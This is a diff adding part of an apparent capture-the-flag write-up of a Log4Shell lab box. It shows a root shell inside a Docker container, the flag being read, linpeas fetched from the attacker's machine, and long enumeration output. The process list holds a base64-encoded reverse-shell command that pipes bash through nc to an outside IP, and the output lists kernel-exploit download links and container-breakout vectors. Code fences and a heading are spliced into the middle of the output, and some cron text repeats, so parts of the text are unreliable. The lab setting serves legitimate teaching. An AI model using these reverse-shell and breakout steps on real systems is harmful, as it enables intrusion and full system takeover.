@@ -527,3 +527,532 @@ drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
 drwxr-xr-x    1 root     root        4.0K Dec 11  2021 app
 drwxr-xr-x    1 root     root        4.0K Dec 11  2021 bin
 drwxr-xr-x   12 root     root        3.4K Jul  9 00:46 dev
+drwxr-xr-x    1 root     root        4.0K Dec 13  2021 etc
+drwxr-xr-x    2 root     root        4.0K Dec 20  2018 home
+drwxr-xr-x    1 root     root        4.0K Dec 11  2021 lib
+drwxr-xr-x    5 root     root        4.0K Dec 20  2018 media
+drwxr-xr-x    2 root     root        4.0K Dec 20  2018 mnt
+drwxr-xr-x    1 root     root        4.0K Dec 11  2021 opt
+dr-xr-xr-x  102 root     root           0 Jul  9 00:46 proc
+drwx------    2 root     root        4.0K Dec 20  2018 root
+drwxr-xr-x    2 root     root        4.0K Dec 20  2018 run
+drwxr-xr-x    1 root     root        4.0K Dec 11  2021 sbin
+drwxr-xr-x    2 root     root        4.0K Dec 20  2018 srv
+dr-xr-xr-x   13 root     root           0 Jul  9 00:46 sys
+drwxrwxrwt    1 root     root        4.0K Jul  9 01:06 tmp
+drwxr-xr-x    1 root     root        4.0K Dec 21  2018 usr
+drwxr-xr-x    1 root     root        4.0K Dec 20  2018 var
+bash-4.4# cd /opt
+cd /opt
+bash-4.4# ls
+ls
+bash-4.4# ls -lah
+ls -lah
+total 12
+drwxr-xr-x    1 root     root        4.0K Dec 11  2021 .
+drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
+-rw-r--r--    1 root     root          19 Dec 11  2021 .flag1
+bash-4.4# cat .flag1
+cat .flag1
+THM{LOG4SHELL_FTW}
+bash-4.4# cd /home
+cd /home
+bash-4.4# ls -lah
+ls -lah
+total 8
+drwxr-xr-x    2 root     root        4.0K Dec 20  2018 .
+drwxr-xr-x    1 root     root        4.0K Dec 13  2021 ..
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.174.76 - - [08/Jul/2023 21:12:58] "GET /linpeas.sh HTTP/1.1" 200 -
+
+bash-4.4# wget http://10.8.19.103:8000/linpeas.sh
+wget http://10.8.19.103:8000/linpeas.sh
+Connecting to 10.8.19.103:8000 (10.8.19.103:8000)
+linpeas.sh             1% |                               | 11484   linpeas.sh             1% |                               | 11484   linpeas.sh             1% |                               | 11484   linpeas.sh            21% |******                         |   176k  linpeas.sh             1% |                               | 11484   linpeas.sh            21% |******                         |   176k  linpeas.sh           100% |*******************************|   808k  0:00:00 ETA
+bash-4.4# chmod +x linpeas.sh
+chmod +x linpeas.sh
+bash-4.4# ./linpeas.sh
+./linpeas.sh
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------| 
+    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
+    |         Follow on Twitter         :     @carlospolopm                           |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          linpeas-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)
+
+ Starting linpeas. Caching Writable Folders...
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+OS: Linux version 4.15.0-163-generic (buildd@lcy01-amd64-021) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #171-Ubuntu SMP Fri Nov 5 11:55:11 UTC 2021
+User & Groups: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+Hostname: 81fbbf1def70
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)n[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
+
+                              ╔════════════════════╗
+══════════════════════════════╣ System Information ╠══════════════════════════════
+                              ╚════════════════════╝
+╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
+Linux version 4.15.0-163-generic (buildd@lcy01-amd64-021) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #171-Ubuntu SMP Fri Nov 5 11:55:11 UTC 2021
+lsb_release Not Found
+
+╔══════════╣ Sudo version
+sudo Not Found
+
+╔══════════╣ CVEs Check
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
+New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
+
+╔══════════╣ Date & uptime
+Sun Jul  9 01:13:16 UTC 2023
+ 01:13:16 up 29 min,  load average: 0.00, 0.01, 0.33
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount umounted devices
+/dev[1;32m/cdrom[0m	/media[1;32m/cdrom[0m	iso9660	noauto,ro 0 0
+/dev/usbdisk	/media/usb	vfat	noauto,ro 0 0
+
+╔══════════╣ Environment
+╚ Any private information inside environment variables?
+HISTFILESIZE=0
+JAVA_ALPINE_VERSION=8.181.13-r0
+HOSTNAME=81fbbf1def70
+LD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64
+SHLVL=6
+OLDPWD=/home
+HOME=/root
+JAVA_VERSION=8u181
+_=./linpeas.sh
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
+LANG=C.UTF-8
+HISTSIZE=0
+JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk
+PWD=/tmp
+HISTFILE=/dev/null
+
+╔══════════╣ Searching Signature verification failed in dmesg
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
+dmesg Not Found
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+main: line 1918: dpkg: command not found
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security//5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security//5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-27365] linux-iscsi
+
+   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
+   Exposure: less probable
+   Tags: RHEL=8
+   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
+   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL: 
+   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
+
+╔══════════╣ Protections
+═╣ AppArmor enabled? .............. AppArmor Not Found
+═╣ grsecurity present? ............ grsecurity Not Found
+═╣ PaX bins present? .............. PaX Not Found
+═╣ Execshield enabled? ............ Execshield Not Found
+═╣ SELinux enabled? ............... sestatus Not Found
+═╣ Seccomp enabled? ............... disabled
+═╣ AppArmor profile? .............. unconfined
+═╣ User namespace? ................ enabled
+═╣ Cgroup2 enabled? ............... enabled
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes
+
+                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════
+                                   ╚═══════════╝
+╔══════════╣ Container related tools present
+╔══════════╣ Am I Containered?
+╔══════════╣ Container details
+═╣ Is this a container? ........... docker
+═╣ Any running containers? ........ No
+╔══════════╣ Docker Container details
+═╣ Am I inside Docker group ....... No
+═╣ Looking and enumerating Docker Sockets
+═╣ Docker version ................. Not Found
+═╣ Vulnerable to CVE-2019-5736 .... Not Found
+═╣ Vulnerable to CVE-2019-13139 ... Not Found
+═╣ Rootless Docker? ................ No
+
+╔══════════╣ Container & breakout enumeration
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
+═╣ Container ID ................... 81fbbf1def70═╣ Container Full ID .............. 81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f
+═╣ Seccomp enabled? ............... disabled
+═╣ AppArmor profile? .............. unconfined
+═╣ User proc namespace? ........... enabled
+═╣ Vulnerable to CVE-2019-5021 .... No
+
+══╣ Breakout via mounts
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
+═╣ release_agent breakout 1........ Yes
+═╣ release_agent breakout 2........ Yes
+═╣ core_pattern breakout .......... Yes
+═╣ binfmt_misc breakout ........... No
+═╣ uevent_helper breakout ......... Yes
+═╣ core_pattern breakout .......... Yes
+═╣ is modprobe present ............ lrwxrwxrwx    1 root     root            12 Dec 20  2018 /sbin/modprobe -> /bin/busybox
+═╣ DoS via panic_on_oom ........... Yes
+═╣ DoS via panic_sys_fs ........... Yes
+═╣ DoS via sysreq_trigger_dos ..... Yes
+═╣ /proc/config.gz readable ....... No
+═╣ /proc/sched_debug readable ..... Yes
+═╣ /proc/*/mountinfo readable ..... No
+═╣ /sys/kernel/security present ... Yes
+═╣ /sys/kernel/security writable .. No
+
+══╣ Namespaces
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
+total 0
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 cgroup -> cgroup:[4026531835]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 ipc -> ipc:[4026532241]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 mnt -> mnt:[4026532239]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 net -> net:[4026532244]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 pid -> pid:[4026532242]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 pid_for_children -> pid:[4026532242]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 user -> user:[4026531837]
+lrwxrwxrwx    1 root     root             0 Jul  9 01:13 uts -> uts:[4026532240]
+
+╔══════════╣ Container Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
+CapInh:	0000003fffffffff
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+╔══════════╣ Privilege Mode
+Privilege Mode is enabled
+
+╔══════════╣ Interesting Files Mounted
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/IVRIXPIPTAUXLMA5W6H67HBIQQ:/var/lib/docker/overlay2/l/SQQT6HBAR3TRQG3IBJAXB7TEIU:/var/lib/docker/overlay2/l/NIZU7EGXOSQLBNUX3TPNWZVUN7:/var/lib/docker/overlay2/l/2C3UM7KSHOQFXMNHLV4UKRHUBA:/var/lib/docker/overlay2/l/PVFSC72LOH4QLOHE2N2M6PO3UL:/var/lib/docker/overlay2/l/BPIAR6WYRW3AONIZA2QK75LNX3:/var/lib/docker/overlay2/l/QJ4UCS3NWCXAINAYJMJONR5IRK:/var/lib/docker/overlay2/l/ALNGHDOKRDHGZIU4CJY7VYW5M5:/var/lib/docker/overlay2/l/PW6ZRSVQMA65T2JMYNI3B2N2SI:/var/lib/docker/overlay2/l/JCGLSV7ETSUUDJI2UQEXQBKHAV,upperdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/diff,workdir=/var/lib/docker/overlay2/45f5ba1171dd637879f1e304a84acac05fad98331af1c87c495022ecb2f61bca/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
+/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
+/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
+/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,data=ordered) [cloudimg-rootfs]
+cgroup on /tmp/cgroup_3628d4 type cgroup (rw,relatime,memory)
+
+╔══════════╣ Possible Entrypoints
+-rwxr-xr-x    1 root     root      808.7K Jul  9 01:13 /tmp/linpeas.sh
+
+                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
+                                     ╚═══════╝
+═╣ Google Cloud Platform? ............... No
+═╣ AWS ECS? ............................. No
+═╣ AWS EC2? ............................. No
+═╣ AWS Lambda? .......................... No
+
+                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
+                ╚════════════════════════════════════════════════╝
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+PID   USER     TIME  COMMAND
+1 root      3:11 java -jar /app/spring-boot-application.jar
+24 root      0:00 /bin/bash -c echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA5OTk5ID4vdG1wL2YK | base64 -d | bash
+28 root      0:00 bash
+31 root      0:00 cat /tmp/f
+32 root      0:00 /bin/bash -i
+33 root      0:00 nc 10.8.19.103 9999
+37 root      0:00 script /dev/null -c bash
+38 root      0:00 bash
+47 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2506 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2509 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2510 root      0:00 ps fauxwww
+2511 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2512 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2513 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2514 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2515 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2516 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2517 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2518 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2519 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2520 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+2521 root      0:00 {linpeas.sh} /bin/sh ./linpeas.sh
+
+╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 Not Found
+sshd Not Found
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+```
+```text
+# do daily/weekly/monthly maintenance
+```
+```text
+# min	hour	day	month	weekday	command
+*/15	*	*	*	*	run-parts /etc/periodic/15min
+0	*	*	*	*	run-parts /etc/periodic/hourly
+0	2	*	*	*	run-parts /etc/periodic/daily
+0	3	*	*	6	run-parts /etc/periodic/weekly
+0	5	1	*	*	run-parts /etc/periodic/monthly
+
+incrontab Not Found
+lrwxrwxrwx    1 root     root            13 Dec 20  2018 /var/spool/cron/crontabs -> /etc/crontabs
+
+/etc/crontabs:
+total 12
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 .
+drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
+-rw-------    1 root     root           283 Jun  7  2018 root
+*/15	*	*	*	*	run-parts /etc/periodic/15min
+0	*	*	*	*	run-parts /etc/periodic/hourly
+0	2	*	*	*	run-parts /etc/periodic/daily
+0	3	*	*	6	run-parts /etc/periodic/weekly
+0	5	1	*	*	run-parts /etc/periodic/monthly
+```
+```text
+# do daily/weekly/monthly maintenance
+```
+
+## Privilege Escalation
+```text
+# min	hour	day	month	weekday	command
+*/15	*	*	*	*	run-parts /etc/periodic/15min
+0	*	*	*	*	run-parts /etc/periodic/hourly
+0	2	*	*	*	run-parts /etc/periodic/daily
+0	3	*	*	6	run-parts /etc/periodic/weekly
+0	5	1	*	*	run-parts /etc/periodic/monthly
+
+/etc/periodic/:
+total 20
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 15min
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 daily
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 hourly
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 monthly
+drwxr-xr-x    2 root     root          4096 Dec 20  2018 weekly
+
+/etc/periodic/15min:
+total 0
+
+/etc/periodic/daily:
+total 0
+
+/etc/periodic/hourly:
+total 0
+
+/etc/periodic/monthly:
+total 0
+
+/etc/periodic/weekly:
+total 0
+
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
+
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
+You can't write on systemd PATH
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
+
+╔══════════╣ Analyzing .timer files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
+
+╔══════════╣ D-Bus config files
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
+
+╔══════════╣ D-Bus Service Objects list
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
+busctl Not Found
+
+                              ╔═════════════════════╗
+══════════════════════════════╣ Network Information ╠══════════════════════════════
+                              ╚═════════════════════╝
+╔══════════╣ Hostname, hosts and DNS
+81fbbf1def70
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.17.0.2	81fbbf1def70
+
+nameserver 10.0.0.2
+search eu-west-1.compute.internal
+
+╔══════════╣ Interfaces
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
+          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:687 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:530 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:875760 (855.2 KiB)  TX bytes:104087 (101.6 KiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1/java
+
+╔══════════╣ Can I sniff with tcpdump?
+No
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Users Information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+╔══════════╣ Do I have PGP keys?
+gpg Not Found
+netpgpkeys Not Found
+netpgp Not Found
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
+ptrace protection is enabled (1)
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+
+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/ash
+
+╔══════════╣ Users with console
+operator:x:11:0:operator:/root:/bin/sh
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+root:x:0:0:root:/root:/bin/ash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon[0m),3(sys)
+uid=10(uucp) gid=14(uucp) groups=14(uucp),14(uucp)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=123(ntp) gid=123(ntp) groups=123(ntp)
+uid=13(man) gid=15(man) groups=15(man),15(man)
